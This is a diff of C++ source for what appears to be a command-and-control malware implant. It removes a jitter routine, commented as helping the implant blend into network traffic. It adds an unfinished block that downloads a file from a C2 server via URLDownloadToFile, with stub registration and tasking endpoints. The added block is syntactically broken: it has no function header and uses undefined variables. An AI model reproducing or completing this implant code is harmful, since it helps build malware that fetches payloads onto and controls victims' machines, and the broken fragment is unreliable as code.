@@ -122,16 +122,21 @@ void Implant::sitAware(){
     return response.text;
 };
 
-// Method to enable/disable the running status on our implant
-void Implant::setRunning(bool isRunningIn) { isRunning = isRunningIn; }
+//Function in progress to download a file from C2 and add it to disk
+{
+    string c2url = "http://localhost:5000"; //Have to make this the URL of th server 
+    string implsntReg = "/implant/register"; //Make this Correct Path 
+    string implantTask = "/implant/task"; //Make this Correct Path
+    URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
 
-
-// Method to set the mean time fo rhow long the implant should wait before contacting server for instructions
-void Implant::setMeanDwell(double meanDwell) {
-    // Exponential_distribution allows the implant to blend in more with the rest of the internet
-    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
+    return 0;
 }
 
+//URLDOWNLOADTOFILE EXAMPLE CODE
+
+//string dwnld_URL = "127.0.0.1/screenchote.png";
+//string savepath = "D:\\screenchote.png";
+//URLDownloadToFile(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
 //set the situational awareness for the implant
 
 // Implant ID: create an ID for the implant to distinguish it from others
